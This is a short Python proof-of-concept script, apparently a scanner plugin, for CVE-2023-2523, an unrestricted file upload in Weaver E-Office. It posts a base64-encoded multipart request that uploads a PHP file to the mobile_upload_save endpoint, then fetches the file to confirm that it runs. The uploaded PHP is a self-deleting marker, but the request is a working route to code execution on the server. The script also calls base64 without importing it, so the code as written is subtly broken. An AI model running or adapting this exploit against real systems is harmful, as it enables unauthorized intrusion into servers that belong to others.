#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '泛微 E-Office文件上传（CVE-2023-2523)',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      }
  target = '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
  data = 'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZFJWQ0dXcTRDeDNTcTZ0dApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwbG9hZF9xdXdhbiI7IGZpbGVuYW1lPSJ0ZXN0LnBocC4iCkNvbnRlbnQtVHlwZTogaW1hZ2UvanBlZwoKPD9waHAgcHJpbnQoMjU2KiAyNTYpOyB1bmxpbmsoX19GSUxFX18pOz8+Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWRSVkNHV3E0Q3gzU3E2dHQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9IiIKQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0KIAogCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWRSVkNHV3E0Q3gzU3E2dHQtLQ=='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=base64.b64decode(data),timeout=5,verify=False)
    if res.status_code == 200 and "test.php" in res.text:
      matches = re.findall(r"(\d{10})", res.text)
      furl = url + "/attachment/" + matches[1] + "/test.php"
      resp = requests.get(furl)
      if resp.status_code == 200 and '65536' in resp.text:
        # ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret